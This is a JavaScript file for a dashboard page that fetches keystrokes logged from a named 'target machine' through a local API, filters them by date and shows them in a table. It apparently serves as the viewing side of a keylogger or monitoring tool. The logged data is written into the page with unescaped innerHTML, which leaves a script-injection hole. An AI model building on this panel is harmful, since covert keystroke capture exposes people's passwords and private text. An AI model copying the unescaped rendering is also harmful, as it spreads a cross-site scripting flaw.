// event listener for the machine page
document.addEventListener('DOMContentLoaded', function () {
    const urlParams = new URLSearchParams(window.location.search);
    const targetMachine = urlParams.get('machine');
    document.getElementById('machineName').textContent = targetMachine;

    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = 'Loading...';

    // Fetch and display keystrokes initially
    getKeystrokes(targetMachine).then(displayKeystrokes);

    // Add event listener for filtering keystrokes
    document.getElementById('filterButton').addEventListener('click', function () {
        const startDate = document.getElementById('startDate').value;
        const endDate = document.getElementById('endDate').value;

        getKeystrokes(targetMachine).then(function (keystrokes) {
            if (!Array.isArray(keystrokes)) {
                keystrokesOutput.textContent = 'Error fetching data';
                return;
            }
            const filteredKeystrokes = filterKeystrokesByDate(keystrokes, startDate, endDate);
            displayKeystrokes(filteredKeystrokes);
        });
    });

    // Add event listener for clearing filters
    document.getElementById('clearButton').addEventListener('click', function () {
        document.getElementById('startDate').value = '';
        document.getElementById('endDate').value = '';
        getKeystrokes(targetMachine).then(displayKeystrokes);
    });
});

// Fetch keystrokes from the backend
function getKeystrokes(targetMachine) {
    return fetch(`http://127.0.0.1:5000/api/get_keystrokes?target_machine=${targetMachine}`)
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok: ' + response.statusText);
            }
            return response.json();
        })
        .then(data => data.keystrokes || [])
        .catch(error => {
            console.error('Error fetching keystrokes:', error);
            return [];
        });
}

// Filter keystrokes by date range
function filterKeystrokesByDate(keystrokes, startDate, endDate) {
    if (!Array.isArray(keystrokes)) return [];
    const start = startDate ? new Date(startDate + 'T00:00:00') : null;
    const end = endDate ? new Date(endDate + 'T23:59:59') : null;
    console.log('start', start);
    console.log('end', end);
    console.log('keystrokes', keystrokes);

    return keystrokes.filter(entry => {
        const timestamp = new Date(entry.timestamp);
        return (!start || timestamp >= start) && (!end || timestamp <= end);
    });
}

// Display keystrokes in a table
function displayKeystrokes(keystrokes) {
    const keystrokesOutput = document.getElementById('keystrokesOutput');
    keystrokesOutput.innerHTML = '';

    if (!keystrokes || keystrokes.length === 0) {
        keystrokesOutput.textContent = 'No data available';
        return;
    }

    const table = document.createElement('table');
    const headerRow = document.createElement('tr');
    headerRow.innerHTML = '<th>Timestamp</th><th>Data</th>';
    table.appendChild(headerRow);

    keystrokes.forEach(entry => {
        const row = document.createElement('tr');
        row.innerHTML = `<td>${entry.timestamp}</td><td>${entry.data}</td>`;
        table.appendChild(row);
    });

    keystrokesOutput.appendChild(table);
}